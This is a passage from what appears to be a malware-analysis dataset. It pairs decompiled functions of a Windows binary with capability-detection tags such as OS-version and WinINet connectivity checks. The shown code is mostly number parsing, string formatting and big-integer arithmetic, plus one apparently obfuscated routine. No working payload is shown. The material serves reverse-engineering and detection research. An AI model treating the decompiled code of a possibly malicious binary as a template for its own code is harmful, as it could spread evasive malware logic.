bVar4 = true;\n    if ((uVar5 == 0x2d) || (uVar5 == 0x2b)) {\n        bVar9 = uVar5 == 0x2d;\n        in_EAX = in_EAX + 1;\n        var_8h = var_8h + 1;\n        if (0 < unaff_EDI[2]) {\n            unaff_EDI[2] = unaff_EDI[2] + -1;\n        }\n    }\n    iVar6 = unaff_EDI[2];\n    if ((iVar6 != 0) && (*in_EAX == 0x30)) {\n        in_EAX = in_EAX + 1;\n        var_8h = var_8h + 1;\n        if (0 < iVar6) {\n            unaff_EDI[2] = iVar6 + -1;\n        }\n        iVar6 = unaff_EDI[2];\n        if ((iVar6 != 0) && ((*in_EAX == 0x78 || (*in_EAX == 0x58)))) {\n            if (var_ch == 0) {\n                var_ch = 0x10;\n            }\n            if (var_ch == 0x10) goto code_r0x0040ad4d;\n            bVar4 = false;\n        }\n    }\n    while ((iVar6 = var_8h,  unaff_EDI[2] != 0 && (*in_EAX == 0x30))) {\n        iVar6 = unaff_EDI[2];\ncode_r0x0040ad4d:\n        in_EAX = in_EAX + 1;\n        var_8h = var_8h + 1;\n        if (0 < iVar6) {\n            unaff_EDI[2] = iVar6 + -1;\n        }\n    }\n    if (unaff_EDI[2] != 0) {\n        iVar11 = 0;\n        do {\n            if ((in_EAX[var_8h - iVar6] == 0) || (iVar7 = fcn.0040ab36(in_EAX[var_8h - iVar6]),  iVar7 == -1)) break;\n            iVar11 = sub.ntdll.dll__allmul();\n            iVar11 = iVar11 + iVar7;\n            var_8h = var_8h + 1;\n            if (0 < unaff_EDI[2]) {\n                unaff_EDI[2] = unaff_EDI[2] + -1;\n            }\n        } while (unaff_EDI[2] != 0);\n    }\n    var_14h = iVar11 >> 0x20;\n    if (!bVar4) {\n        return var_8h;\n    }\n    if (arg_8h == NULL) goto code_r0x0040b05b;\n    if ((bVar9) && (*unaff_EDI == 5)) {\n        iVar11 = CONCAT44(-(var_14h + (iVar11 != 0)), -iVar11);\n    }\n    uVar2 = unaff_EDI[1];\n    if ((uVar2 & 8) == 0) {\n        if ((uVar2 & 2) != 0) {\n            *arg_8h = iVar11;\n            goto code_r0x0040b05b;\n        }\n        if (((uVar2 & 1) == 0) && ((uVar2 & 0x20) == 0)) {\n            if ((uVar2 & 0x10) != 0) {\n                *arg_8h = iVar11;\n                *(arg_8h + 4) = iVar11 >> 0x20;\n            }\n            goto code_r0x0040b05b;\n        }\n    }\n    *arg_8h = iVar11;\ncode_r0x0040b05b:\n    *arg_ch = 1;\n    return var_8h;\n}\n",
        "token_count": 3241
    },
    "0040b093": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Switch with 1 destination removed at 0x0040b125 : 10 cases all go to same destination\n\nint32_t __cdecl fcn.0040b093(int32_t arg_8h)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint arg_8h_00;\n    char *in_ECX;\n    uint *puVar2;\n    int32_t iStack40;\n    int32_t iStack36;\n    char *pcStack32;\n    int32_t iStack28;\n    uint8_t uStack24;\n    \n    if (((in_EAX == NULL) || (in_ECX == NULL)) || (*in_ECX == '\\0')) {\n        iStack40 = 0;\n    }\n    else {\n        iStack40 = 0;\n        if (*in_EAX != '\\0') {\n            puVar2 = arg_8h + -4;\n            do {\n                iVar1 = (*_sym.imp.ntdll.dll_isspace)(*in_EAX);\n                if (iVar1 != 0) {\n                    while ((*in_ECX != '\\0' && (iVar1 = (*_sym.imp.ntdll.dll_isspace)(*in_ECX),  iVar1 != 0))) {\n                        in_ECX = in_ECX + 1;\n                    }\n                    in_EAX = in_EAX + 1;\n                }\n                if (*in_EAX == '%') {\n                    iVar1 = fcn.0040a996(in_EAX + 1, &iStack28);\n                    pcStack32 = in_EAX + 1 + iVar1;\n                    arg_8h_00 = 0;\n                    if (((uStack24 & 0x40) == 0) && (iStack28 - 1U < 10)) {\n    // switch table (10 cases) at 0x40b17b\n                        puVar2 = puVar2 + 1;\n                        arg_8h_00 = *puVar2;\n                    }\n                    iStack36 = 0;\n                    iVar1 = fcn.0040ab87(arg_8h_00, &iStack36);\n                    if (iStack36 == 0) {\n                        return iStack40;\n                    }\n                    iStack40 = iStack40 + iStack36;\n                    in_ECX = in_ECX + iVar1;\n                    in_EAX = pcStack32;\n                }\n                else {\n                    if (*in_EAX != *in_ECX) {\n                        return iStack40;\n                    }\n                    in_EAX = in_EAX + 1;\n                    in_ECX = in_ECX + 1;\n                }\n            } while (*in_EAX != '\\0');\n        }\n    }\n    return iStack40;\n}\n",
        "token_count": 585
    },
    "0040b5c5": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040b5c5(uint16_t *arg_8h, uint16_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint16_t *arg_10h;\n    uint32_t *puStack316;\n    int32_t iStack312;\n    uint32_t *puStack308;\n    uint32_t uStack304;\n    uint32_t uStack300;\n    uchar uStack292;\n    uchar uStack291;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    uint32_t uStack268;\n    char acStack264 [260];\n    \n    iStack312 = 0;\n    if (*arg_ch != 0) {\n        puStack316 = in_EAX + -4;\n        puStack308 = in_EAX + -8;\n        arg_10h = arg_8h;\n        do {\n            if (*arg_ch == 0x25) {\n                arg_ch = arg_ch + 1;\n                if (*arg_ch == 0x25) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = 0x25;\n                        arg_10h = arg_10h + 1;\n                    }\n                    goto code_r0x0040b60c;\n                }\n                iVar2 = fcn.0040b455(arg_ch, &uStack284);\n                arg_ch = arg_ch + iVar2;\n                if (uStack284 == 1) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uStack304 = uStack304 & 0xffffff00 | *puStack316;\n                }\n                else if (uStack284 == 2) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uVar1 = *puStack316;\ncode_r0x0040b6c3:\n                    uStack304 = uStack304 & 0xffff0000 | uVar1;\n                }\n                else if ((uStack284 == 3) || (uStack284 == 4)) {\n                    puStack308 = puStack308 + 1;\n                    puStack316 = puStack316 + 1;\n                    uStack304 = *puStack316;\n                }\n                else {\n                    if (3 < uStack284 - 5) {\n                        uVar1 = 0;\n                        goto code_r0x0040b6c3;\n                    }\n                    if ((((uStack280 & 0x800) == 0) && ((uStack280 & 0x80) == 0)) && ((uStack280 & 0x100) != 0)) {\n                        uStack304 = puStack308[2];\n                        puStack316 = puStack316 + 2;\n                        uStack300 = puStack308[3];\n                        puStack308 = puStack308 + 2;\n                    }\n                    else {\n                        puStack308 = puStack308 + 1;\n                        puStack316 = puStack316 + 1;\n                        uStack304 = *puStack316;\n                        uStack300 = uStack304 >> 0x1f;\n                    }\n                }\n                uStack268 = fcn.0040b1a3(acStack264, uStack304, uStack300);\n                iStack312 = iStack312 + uStack268;\n                uStack288 = uStack280 & 1;\n                if ((uStack288 == 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x20;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                uVar3 = 0;\n                iVar2 = iStack312;\n    // switch table (9 cases) at 0x40b8f1\n                switch(uStack284) {\n                case 0:\n                    goto code_r0x0040b8c2;\n                case 1:\n                    if (arg_10h != NULL) {\n                        uStack304._0_2_ = uStack304;\ncode_r0x0040b787:\n                        *arg_10h = uStack304;\n                        arg_10h = arg_10h + 1;\n                    }\n                    break;\n                case 2:\n                    if (arg_10h != NULL) {\n                        goto code_r0x0040b787;\n                    }\n                    break;\n                case 3:\n                    if ((arg_10h != NULL) && (uVar3 = 0,  uStack268 != 0)) {\n                        do {\n                            uStack292 = *(uVar3 + uStack304);\n                            uStack291 = 0;\n                            fcn.00408e40(&uStack292, 1, arg_10h);\n                            arg_10h = arg_10h + 1;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < uStack268);\n                    }\n                    break;\n                case 4:\n                    if ((arg_10h != NULL) && (uVar3 = 0,  uStack268 != 0)) {\n                        do {\n                            *arg_10h = *(uStack304 + uVar3 * 2);\n                            arg_10h = arg_10h + 1;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < uStack268);\n                    }\n                    break;\n                case 7:\n                case 8:\n                    if (((uStack280 & 2) != 0) && (((uStack304 | uStack300) != 0 || ((uStack280 & 0x1000) != 0)))) {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x30;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iStack312 + 1;\n                        if (uStack284 == 7) {\n                            if (arg_10h != NULL) {\n                                *arg_10h = ~uStack280 & 0x20 | 0x58;\n                                arg_10h = arg_10h + 1;\n                            }\n                            iVar2 = iStack312 + 2;\n                        }\n                    }\n                case 5:\n                    iStack312 = iVar2;\n                    if ((arg_10h != NULL) && (acStack264[0] == '-')) {\n                        *arg_10h = 0x2d;\n                        arg_10h = arg_10h + 1;\n                        uVar3 = 1;\n                    }\n                case 6:\n                    if (uStack268 < uStack272) {\n                        iVar2 = uStack272 - uStack268;\n                        iStack312 = iStack312 + iVar2;\n                        do {\n                            if (arg_10h != NULL) {\n                                *arg_10h = 0x30;\n                                arg_10h = arg_10h + 1;\n                            }\n                            iVar2 = iVar2 + -1;\n                        } while (iVar2 != 0);\n                    }\n                    if (arg_10h != NULL) {\n                        for (; uVar3 < uStack268; uVar3 = uVar3 + 1) {\n                            *arg_10h = acStack264[uVar3];\n                            arg_10h = arg_10h + 1;\n                        }\n                    }\n                }\n                if ((uStack288 != 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (arg_10h != NULL) {\n                            *arg_10h = 0x20;\n                            arg_10h = arg_10h + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n            }\n            else {\n                if (arg_10h != NULL) {\n                    *arg_10h = *arg_ch;\n                    arg_10h = arg_10h + 1;\n                }\ncode_r0x0040b60c:\n                arg_ch = arg_ch + 1;\n                iStack312 = iStack312 + 1;\n            }\ncode_r0x0040b8c2:\n        } while (*arg_ch != 0);\n        if ((iStack312 != 0) && (arg_8h != NULL)) {\n            arg_8h[iStack312] = 0;\n        }\n    }\n    return iStack312;\n}\n",
        "token_count": 1962
    },
    "0040ba84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040ba84(uint8_t *arg_8h, uint8_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    int32_t iStack312;\n    uint8_t *puStack308;\n    uint32_t *puStack304;\n    uint32_t *puStack300;\n    uint32_t uStack296;\n    uint32_t uStack292;\n    uint32_t uStack284;\n    uint32_t uStack280;\n    uint32_t uStack276;\n    uint32_t uStack272;\n    ushort uStack268;\n    ushort uStack266;\n    char acStack264 [260];\n    \n    iStack312 = 0;\n    puStack308 = arg_8h;\n    if (*arg_ch != 0) {\n        puStack300 = in_EAX + -4;\n        puStack304 = in_EAX + -8;\n        puVar5 = arg_8h;\n        do {\n            if (*arg_ch == 0x25) {\n                arg_ch = arg_ch + 1;\n                if (*arg_ch == 0x25) {\n                    if (puVar5 != NULL) {\n                        *puVar5 = 0x25;\n                        goto code_r0x0040bacb;\n                    }\n                    goto code_r0x0040bad0;\n                }\n                iVar2 = fcn.0040b935(arg_ch, &uStack284);\n                arg_ch = arg_ch + iVar2;\n                if (uStack284 == 1) {\n                    uStack296 = uStack296 & 0xffffff00 | *(puStack300 + 1);\ncode_r0x0040bbb7:\n                    puStack304 = puStack304 + 1;\n                    puStack300 = puStack300 + 1;\n                }\n                else {\n                    if (uStack284 == 2) {\n                        uStack296 = uStack296 & 0xffff0000 | *(puStack300 + 1);\n                        goto code_r0x0040bbb7;\n                    }\n                    if ((uStack284 == 3) || (uStack284 == 4)) {\n                        puStack304 = puStack304 + 1;\n                        puStack300 = puStack300 + 1;\n                        uStack296 = *puStack300;\n                    }\n                    else if (uStack284 - 5 < 4) {\n                        if ((((uStack280 & 0x800) == 0) && ((uStack280 & 0x80) == 0)) && ((uStack280 & 0x100) != 0)) {\n                            uStack296 = puStack304[2];\n                            uStack292 = puStack304[3];\n                            puStack300 = puStack300 + 2;\n                            puStack304 = puStack304 + 2;\n                        }\n                        else {\n                            puStack300 = puStack300 + 1;\n                            uStack296 = *puStack300;\n                            uStack292 = uStack296 >> 0x1f;\n                            puStack304 = puStack304 + 1;\n                        }\n                    }\n                    else {\n                        uStack296 = uStack296 & 0xffff0000;\n                    }\n                }\n                uVar3 = fcn.0040b1a3(acStack264, uStack296, uStack292);\n                iStack312 = iStack312 + uVar3;\n                uVar1 = uStack280 & 1;\n                if ((uVar1 == 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x20;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                        puStack308 = puVar5;\n                    } while (iVar2 != 0);\n                }\n                uVar4 = 0;\n                iVar2 = iStack312;\n    // switch table (9 cases) at 0x40bd70\n                switch(uStack284) {\n                case 0:\n                    goto code_r0x0040bcaa;\n                case 1:\n                case 2:\n                    if (puVar5 != NULL) {\n                        *puVar5 = uStack296;\n                        puVar5 = puVar5 + 1;\n                        puStack308 = puVar5;\n                    }\n                    break;\n                case 3:\n                    if ((puVar5 != NULL) && (uVar4 = 0,  uVar3 != 0)) {\n                        do {\n                            *puVar5 = *(uVar4 + uStack296);\n                            puVar5 = puVar5 + 1;\n                            uVar4 = uVar4 + 1;\n                            puStack308 = puVar5;\n                        } while (uVar4 < uVar3);\n                    }\n                    break;\n                case 4:\n                    if ((puVar5 != NULL) && (uVar4 = 0,  puVar5 = puStack308,  uVar3 != 0)) {\n                        do {\n                            uStack268 = *(uStack296 + uVar4 * 2);\n                            uStack266 = 0;\n                            fcn.00408d65(&uStack268, 1, puStack308);\n                            puVar5 = puStack308 + 1;\n                            uVar4 = uVar4 + 1;\n                            puStack308 = puVar5;\n                        } while (uVar4 < uVar3);\n                    }\n                    break;\n                case 7:\n                case 8:\n                    if (((uStack280 & 2) != 0) && (((uStack296 | uStack292) != 0 || ((uStack280 & 0x1000) != 0)))) {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x30;\n                            puVar5 = puVar5 + 1;\n                            puStack308 = puVar5;\n                        }\n                        iVar2 = iStack312 + 1;\n                        if (uStack284 == 7) {\n                            if (puVar5 != NULL) {\n                                *puVar5 = ~uStack280 & 0x20 | 0x58;\n                                puVar5 = puVar5 + 1;\n                                puStack308 = puVar5;\n                            }\n                            iVar2 = iStack312 + 2;\n                        }\n                    }\n                case 5:\n                    iStack312 = iVar2;\n                    if ((puVar5 != NULL) && (acStack264[0] == '-')) {\n                        *puVar5 = 0x2d;\n                        puVar5 = puVar5 + 1;\n                        uVar4 = 1;\n                        puStack308 = puVar5;\n                    }\n                case 6:\n                    if (uVar3 < uStack272) {\n                        iVar2 = uStack272 - uVar3;\n                        iStack312 = iStack312 + iVar2;\n                        do {\n                            if (puVar5 != NULL) {\n                                *puVar5 = 0x30;\n                                puVar5 = puVar5 + 1;\n                            }\n                            iVar2 = iVar2 + -1;\n                            puStack308 = puVar5;\n                        } while (iVar2 != 0);\n                    }\n                    if ((puVar5 != NULL) && (uVar4 < uVar3)) {\n                        sub.ntdll.dll_memcpy(puVar5, acStack264 + uVar4, uVar3 - uVar4);\n                        puVar5 = puVar5 + (uVar3 - uVar4);\n                        puStack308 = puVar5;\n                    }\n                }\n                if ((uVar1 != 0) && (uStack272 < uStack276)) {\n                    iVar2 = uStack276 - uStack272;\n                    iStack312 = iStack312 + iVar2;\n                    do {\n                        if (puVar5 != NULL) {\n                            *puVar5 = 0x20;\n                            puVar5 = puVar5 + 1;\n                        }\n                        iVar2 = iVar2 + -1;\n                        puStack308 = puVar5;\n                    } while (iVar2 != 0);\n                }\n            }\n            else {\n                if (puVar5 != NULL) {\n                    *puVar5 = *arg_ch;\ncode_r0x0040bacb:\n                    puVar5 = puVar5 + 1;\n                    puStack308 = puVar5;\n                }\ncode_r0x0040bad0:\n                arg_ch = arg_ch + 1;\n                iStack312 = iStack312 + 1;\n            }\ncode_r0x0040bcaa:\n        } while (*arg_ch != 0);\n        if ((iStack312 != 0) && (arg_8h != NULL)) {\n            arg_8h[iStack312] = 0;\n        }\n    }\n    return iStack312;\n}\n",
        "token_count": 1965
    },
    "0040c2f3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c2f3(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t *unaff_ESI;\n    \n    uVar2 = *0x4140f8;\n    iVar5 = in_EAX * arg_8h * 0x10000 + in_EAX * arg_ch;\n    *unaff_ESI = *unaff_ESI - iVar5;\n    *0x414008 = 0x6f2bb6;\n    fcn.0040bde1(uVar2);\n    uVar3 = -iVar5 - 1;\n    if (uVar3 <= *unaff_ESI && *unaff_ESI != uVar3) {\n        iVar1 = 6;\n        do {\n            if (0x37958d < *0x414008) {\n                iVar5 = fcn.0040bde1(*0x414124);\n                iVar4 = fcn.0040bde1(*0x414080);\n                if (iVar5 <= iVar4) {\n                    iVar5 = fcn.0040bdb9(0x43);\n                    *0x414008 = *0x414008 ^ iVar5 + 0xe1U;\n                }\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n        unaff_ESI[1] = unaff_ESI[1] - 1;\n    }\n    unaff_ESI[1] = unaff_ESI[1] - (in_EAX * arg_8h >> 0x10);\n    if (*0x414008 < 0x3795e3) {\n        fcn.0040bde1(*0x4140a4);\n    }\n    return;\n}\n",
        "token_count": 430
    },
    "0040cb05": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cb05(int32_t arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *arg_14h_00;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    ulong uVar9;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.0040cfc5();\n    fcn.0040cfc5();\n    arg_14h_00 = fcn.0040cf67(arg_18h);\n    uVar9 = fcn.0040cf67(arg_10h);\n    puVar6 = uVar9 >> 0x20;\n    iVar7 = uVar9 - arg_14h_00;\n    if (arg_14h_00 == NULL) {\n        return 0xffffffff;\n    }\n    if (arg_14h_00 == 0x1) {\n        uVar4 = fcn.0040d275(arg_10h, *puVar6);\n        *arg_ch = uVar4;\n        return 0;\n    }\n    if (iVar7 < 0) {\ncode_r0x0040cb76:\n        fcn.0040cfad(arg_10h);\n    }\n    else {\n        if (iVar7 == 0) {\n            iVar5 = fcn.0040cf16(arg_10h);\n            if (iVar5 < 0) goto code_r0x0040cb76;\n            puVar6 = arg_18h;\n            if (iVar5 == 0) {\n                fcn.0040cfe1();\n                return 0;\n            }\n        }\n        var_ch = 0;\n        var_18h = 0x80000000;\n        do {\n            if ((var_18h & puVar6[arg_14h_00 + -1]) != 0) break;\n            var_18h = var_18h >> 1;\n            var_ch = var_ch + 1;\n        } while (var_ch < 0x20);\n        fcn.0040cff9(puVar6, puVar6, var_ch, arg_14h_00);\n        var_28h = iVar7 + arg_14h_00;\n        iVar5 = fcn.0040cff9(arg_ch, arg_10h, var_ch, var_28h);\n        var_10h = arg_ch + iVar7;\n        var_20h = arg_18h + (iVar7 * -4 - arg_ch);\n        var_2ch = arg_8h - arg_ch;\n        var_18h = iVar7;\n        var_14h = arg_ch + var_28h + -1;\n        do {\n            var_8h = 0;\n            var_34h = *var_14h;\n            var_30h = iVar5;\n            iVar7 = fcn.0040c3ba(&var_4h, &var_1ch, arg_18h[arg_14h_00 + -1]);\n            if (iVar7 == 0) {\ncode_r0x0040cc6a:\n                iVar7 = var_30h;\n                if (var_4h != 0) {\n                    if (var_8h == 0) goto code_r0x0040cc76;\n                    goto code_r0x0040ccc8;\n                }\n            }\n            else {\n                var_4h = -1;\n                var_1ch = *var_14h + arg_18h[arg_14h_00 + -1];\n                if (var_1ch < arg_18h[arg_14h_00 + -1]) {\n                    var_8h = 1;\n                    goto code_r0x0040cc6a;\n                }\ncode_r0x0040cc76:\n                uVar2 = var_1ch;\n                var_24h = arg_ch + arg_14h_00 + var_18h + -2;\n                iVar7 = fcn.0040cad9(*var_24h);\n                if (iVar7 != 0) {\n                    var_4h = var_4h + -1;\n                    var_1ch = uVar2 + arg_18h[arg_14h_00 + -1];\n                    if ((arg_18h[arg_14h_00 + -1] <= var_1ch) && (iVar7 = fcn.0040cad9(*var_24h),  iVar7 != 0)) {\n                        var_4h = var_4h + -1;\n                    }\n                }\ncode_r0x0040ccc8:\n                iVar7 = var_30h;\n                if (var_4h != 0) {\n                    var_8h = 0;\n                    puVar3 = arg_14h_00;\n                    puVar6 = var_24h;\n                    puVar8 = var_10h;\n                    while (var_24h = puVar3,  var_24h != NULL) {\n                        fcn.0040be29(&var_3ch);\n                        *puVar8 = *puVar8 - var_8h;\n                        var_8h = -var_8h - 1 < *puVar8;\n                        *puVar8 = *puVar8 - var_3ch;\n                        if (-var_3ch - 1U <= *puVar8 && *puVar8 != -var_3ch - 1U) {\n                            var_8h = var_8h + 1;\n                        }\n                        var_8h = var_8h + var_38h;\n                        puVar8 = puVar8 + 1;\n                        puVar6 = var_24h + -1;\n                        puVar3 = puVar6;\n                    }\n                    iVar7 = var_30h - var_8h;\n                    var_24h = puVar6;\n                }\n            }\n            *(var_2ch + var_10h) = var_4h;\n            if (iVar7 != 0) {\n                *(var_2ch + var_10h) = var_4h + -1;\n                fcn.0040c9ae(arg_18h, arg_14h_00);\n            }\n            var_18h = var_18h + -1;\n            var_10h = var_10h + -1;\n            var_20h = var_20h + 4;\n            piVar1 = var_14h + -1;\n            iVar5 = *var_14h;\n            var_14h = piVar1;\n        } while (-1 < var_18h);\n        if (arg_14h_00 < var_28h) {\n            puVar6 = arg_ch + arg_14h_00;\n            for (iVar7 = var_28h - arg_14h_00; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n        }\n        fcn.0040d0be(arg_ch, arg_ch, var_ch, arg_14h_00);\n        fcn.0040d0be(arg_18h, arg_18h, var_ch, arg_14h_00);\n    }\n    return 0;\n}\n",
        "token_count": 1776
    },
    "0040cda3": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cda3(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint32_t *var_8h;\n    \n    uVar2 = arg_10h;\n    var_18h = arg_10h * 2;\n    iVar4 = var_18h;\n    puVar7 = arg_8h;\n    if (var_18h != 0) {\n        for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n    }\n    arg_10h = 0;\n    var_18h = var_18h + -1;\n    if (uVar2 != 0) {\n        var_10h = arg_ch;\n        uVar6 = 1;\n        var_1ch = arg_8h + uVar2;\n        do {\n            iVar4 = uVar6 * 2 + -2;\n            var_14h = iVar4;\n            fcn.0040be29(&var_24h);\n            uVar5 = arg_8h[iVar4];\n            var_24h = var_24h + uVar5;\n            if (var_24h < uVar5) {\n                var_20h = var_20h + 1;\n            }\n            uVar5 = 0;\n            if ((var_14h == var_18h) && (arg_10h != 0)) {\n                var_20h = var_20h + arg_10h;\n                uVar5 = var_20h < arg_10h;\n                arg_10h = 0;\n            }\n            arg_8h[iVar4] = var_24h;\n            var_ch = uVar6;\n            if (uVar6 < uVar2) {\n                var_14h = uVar6 * 2 + -1;\n                var_28h = uVar5;\n                var_8h = arg_8h + var_14h;\n                do {\n                    uVar3 = var_20h;\n                    fcn.0040be29(&var_24h);\n                    uVar8 = var_24h * 2 + uVar3;\n                    uVar5 = -(var_20h >> 0x1f);\n                    var_20h = var_20h * 2 | var_24h >> 0x1f;\n                    if ((uVar8 < uVar3) && (var_20h = var_20h + 1,  var_20h == 0)) {\n                        uVar5 = uVar5 + 1;\n                    }\n                    var_20h = var_20h + var_28h;\n                    if (var_20h < var_28h) {\n                        uVar5 = uVar5 + 1;\n                    }\n                    var_24h = uVar8 + *var_8h;\n                    if ((var_24h < *var_8h) && (var_20h = var_20h + 1,  var_20h == 0)) {\n                        uVar5 = uVar5 + 1;\n                    }\n                    if ((var_14h == var_18h) && (arg_10h != 0)) {\n                        var_20h = var_20h + arg_10h;\n                        if (var_20h < arg_10h) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        arg_10h = 0;\n                    }\n                    var_ch = var_ch + 1;\n                    puVar1 = var_8h + 1;\n                    var_14h = var_14h + 1;\n                    *var_8h = var_24h;\n                    var_28h = uVar5;\n                    var_8h = puVar1;\n                } while (var_ch < uVar2);\n            }\n            var_10h = var_10h + 4;\n            *var_1ch = var_20h;\n            var_18h = (uVar2 - 1) + uVar6;\n            bVar9 = uVar6 < uVar2;\n            uVar6 = uVar6 + 1;\n            arg_10h = uVar5;\n            var_1ch = var_1ch + 1;\n        } while (bVar9);\n    }\n    return 0;\n}\n",
        "token_count": 1123
    },
    "0040cf47": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0040cf47(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if (param_2 != 0) {\n        do {\n            if (*(param_1 + uVar1 * 4) != 0) {\n                return 0;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "0040cf67": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.0040cf67(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    do {\n        iVar1 = in_EAX;\n        if (iVar1 == 0) {\n            return 0;\n        }\n        in_EAX = iVar1 + -1;\n    } while (*(param_1 + (iVar1 + -1) * 4) == 0);\n    return iVar1;\n}\n",
        "token_count": 103
    },
    "0040d0be": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
